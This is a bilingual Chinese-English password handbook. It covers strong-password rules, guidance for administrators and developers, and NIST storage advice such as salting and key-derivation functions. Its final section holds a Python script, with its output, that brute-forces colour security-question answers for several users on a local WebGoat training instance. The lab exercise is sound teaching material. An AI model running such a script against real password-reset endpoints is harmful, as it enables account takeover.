# 强密码手册


## 强密码原则

强破解 + 容易记

### 对用户

1. 不用常见弱密码
2. 长度8位以上
3. 字符、数据、特殊符号都要用
4. use different passwords for different accounts
5. use two factor authentication。If possible, use two factor authentication methods to add an extra layer of security to your accounts.



### 对管理者

1. no composition rules：Do not request the user to e.g. use at least one upper case letter and a special character on their password. Give them the opportunity to, but do not force them!
2. 不要密码提示。If you wanted people have a better chance at guessing your password, write it on a note attached to your screen.
3. 不要安全问题。 Security questions, also known as knowledge-based authentication (KBA) are outdated. Asking a user “What’s the name of your pet?” or something similar to check if it’s really him, is pretty unsecure.`http://goodsecurityquestions.com/`
4. 不必强制定期更新密码。如果你没有强制更新，用户会更容易选择强密码
5. **最小**长度为8。
6. 支持所有Unicode字符。同时包括emojis和空格
7. 禁止用户选择123456等常见弱密码

## 易用性“备忘”建议

### 对用户

1. 密码一部分所有网站通用如“#”+姓名简写，另一部分各网站不同如，淘宝网为“tbw”；
2. 使用密码管理工具，如“1Password”；
3. passphrases，如，https://www.rempe.us/diceware/#eff。（The longer the better）

### 对开发者

1. 允许粘贴密码。Users should be able to use the "paste" functionality when entering a password. Since this facilitates the use of password managers, it also increases the likelihood that the user will choose a strong password.
2. allow to display the password。 Password inputs should have an option to display the entered password to assist the user in successfully entering a password.
3. offer a strength meter。Add a strength meter on the password creation page to help the user to choose a strong and secure password.

## 密码存储

## Storing passwords

After a strong and secure password was created, it also has to be stored in a secure way. The NIST gives recommendations on how applications should handle passwords and how to store them securely.

### How should a password be stored?

- first of all: **use encryption and a protected channel for requesting passwords**
  The verifier shall use approved encryption and an authenticated protected channel when requesting memorized secrets in order to provide resistance to eavesdropping and MitM (Man-in-the-middle) attacks.
- **resistant to offline attacks**
  Passwords should be stored in a form that is resistant to offline attacks.
- **use salts**
  Passwords should be salted before storing them. The salt shall have at least 32 bits in length and should be chosen arbitrarily so as to minimize salt value collisions among stored hashes.
- **use hashing**
  Before storing a password it should be hashed with a one way key derivation function. The function takes the password, the salt and a cost factor as inputs and then generates a password hash.
  Examples of suitable key derivation functions:
  - Password-based Key Derivation Function 2 ([PBKDF2](https://pages.nist.gov/800-63-3/sp800-63b.html#SP800-132)) (as large as possible ⇒ at least 10.000 iterations)
  - [BALLOON](https://pages.nist.gov/800-63-3/sp800-63b.html#SP800-132)
  - The key derivation function shall use an approved one-way function such as:
    - Keyed Hash Message Authentication Code ([HMAC](https://pages.nist.gov/800-63-3/sp800-63b.html#FIPS198-1))
    - any approved hash function in [SP 800-107](https://pages.nist.gov/800-63-3/sp800-63b.html#SP800-107)
    - Secure Hash Algorithm 3 ([SHA-3](https://pages.nist.gov/800-63-3/sp800-63b.html#FIPS202))
    - [CMAC](https://pages.nist.gov/800-63-3/sp800-63b.html#SP800-38B)
    - Keccak Message Authentication Code (KMAC)
    - Customizable SHAKE (cSHAKE)
    - [ParallelHash](https://pages.nist.gov/800-63-3/sp800-63b.html#SP800-185)
- **memory hard key derivation function**
  Use memory hard key derivation functions to further increase the needed cost to perform attacks.
- **high cost factor**
  The cost factor (iteration count) of the key derivation function should be as large as verification server performance will allow. (at least 10.000 iterations)

## 安全问题

```python
import requests
import json
from os.path import abspath, dirname

"""
需要自己改
"""
base_url = "http://localhost:8080"
relative_url = "/WebGoat/PasswordReset/questions"

cookie = {
    "JSESSIONID":"46439A2C88C45786DABA7007969E3574",
    "WEBWOLFSESSION": "BC69F44B500560B73D40FD84141A9B9E"
}
common_color_set = ["red", "orange", "yellow", "green", "cyan", 
        "blue", "indigo", "violet", "purple", 
        "magenta", "pink", "brown", "white", 
        "gray", "black"]
user_set = ["tom", "admin", "larry"]

result = dict()
result_file_name = "xxe3.txt"
result_file_path = dirname(abspath(__file__)) + "\\" + result_file_name

def guess_color(username, color):
    
    params = {
        'username': username, 
        'securityQuestion': color
    }
    r = requests.post(url, cookies=cookie, data=params)
    result_json = r.json()
    feedback = str(result_json['feedback']).strip()
    if (feedback == "Sorry the solution is not correct, please try again."):
        return False
    result[username] = color
    return True
    

if __name__ == "__main__":
    url = base_url + relative_url
    for user in user_set:
        for color in common_color_set:
            isRight = guess_color(user, color)
    with open(result_file_path, 'a') as f:
        for username, color in result.items():
            f.write(username + ": " + color + "\n")
```


result:

```txt
tom: purple
admin: green
larry: yellow
```

## Reference

National Institute of Standards and Technology（NIST）

https://www.passwordping.com/surprising-new-password-guidelines-nist/

https://pages.nist.gov/800-63-3/sp800-63b.html